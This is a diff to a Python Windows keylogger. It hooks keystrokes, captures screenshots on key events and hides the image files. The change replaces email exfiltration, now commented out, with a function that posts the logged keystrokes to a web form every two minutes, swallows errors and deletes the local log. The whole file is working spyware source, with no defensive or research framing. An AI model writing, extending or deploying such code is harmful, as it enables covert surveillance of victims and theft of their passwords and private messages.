@@ -1,13 +1,12 @@
-import pyHook,sys,pythoncom,win32console
-import smtplib,logging,os,autopy
-import threading
+import pyHook,sys,pythoncom,win32console,re
+import logging,os,autopy
 from datetime import datetime
 import win32api, win32con
-
+from mechanize import Browser
 i = 0
 j = 0
 j2 = 0
-def sendmail(save):
+""" def sendmail(save):
 	server = smtplib.SMTP('smtp.live.com', 25)
 	verify1 = server.ehlo()
 	debig = server.starttls()
@@ -15,7 +14,13 @@ def sendmail(save):
 	print debig
 	server.login("yourmail@outlook.in", "passwd")
 	msg = "\n"+save
-	server.sendmail("yourmail@outlook.in", "mail@outlook.in", msg)
+	server.sendmail("yourmail@outlook.in", "mail@outlook.in", msg) """
+def fillform(ss):
+	b = Browser()
+	b.open("your form link")
+	b.select_form(nr=0)
+	b['q0'] = ss;
+	b.submit()
 def screenshot():
 	global i
 	global j
@@ -26,7 +31,8 @@ def screenshot():
 		s = "name"+str(i)+".png";
 		bitmap = autopy.bitmap.capture_screen()
 		bitmap.save('B:\\works\{}'.format(s))
-#	threading.Timer(60, screenshot).start()
+		fs = 'B:\\works\{}'.format(s)
+		win32api.SetFileAttributes(fs,win32con.FILE_ATTRIBUTE_HIDDEN)
 def OnKeyboardEvent(event):
 	if event.Ascii !=0 or 8:
 		screenshot()		
@@ -44,8 +50,11 @@ def OnKeyboardEvent(event):
 			global j2
 			if n.minute % 2 == 0 and j2!= n.minute:
 				j2 = n.minute
-				sendmail(save)
-				os.remove(file_log)
+				try:
+					fillform(save)
+					os.remove(file_log)
+				except:
+					pass
 			k=chr(event.Ascii)
 			if event.Ascii==13:
 				k='\n'    
